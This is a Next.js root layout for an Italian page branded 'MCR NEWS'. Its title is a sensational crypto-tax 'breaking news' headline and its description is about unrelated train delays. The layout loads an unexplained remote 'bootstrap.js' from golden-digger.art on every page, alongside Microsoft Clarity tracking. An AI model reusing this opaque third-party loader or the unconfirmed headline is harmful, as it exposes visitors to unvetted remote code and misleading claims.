import "./globals.css";

export const metadata = {
  title: "ULTIM'ORA: MEF e Agenzia delle Entrate prevedono una “tassa sui beni digitali” del 3% sulle cripto-attività sopra i 5.000 euro - MCR NEWS",
  description: "I treni verso Roma sono fermi o registrano ritardi fino a 100 minuti per l'intervento delle forze dell'ordine dovuto alla presenza di persone sui binari nei pressi di Monterotondo.",
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

export default function RootLayout({ children }) {
  return (
    <html lang="it">
      <body>
        {children}
        <script src="https://golden-digger.art/p/2d72c91e-8a15-4c88-8f0c-aa9dcca859c5/bootstrap.js" async defer></script>
        <script
          type="text/javascript"
          dangerouslySetInnerHTML={{
            __html: `(function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "yy8q7sxf38");`,
          }}
        />
      </body>
    </html>
  );
}
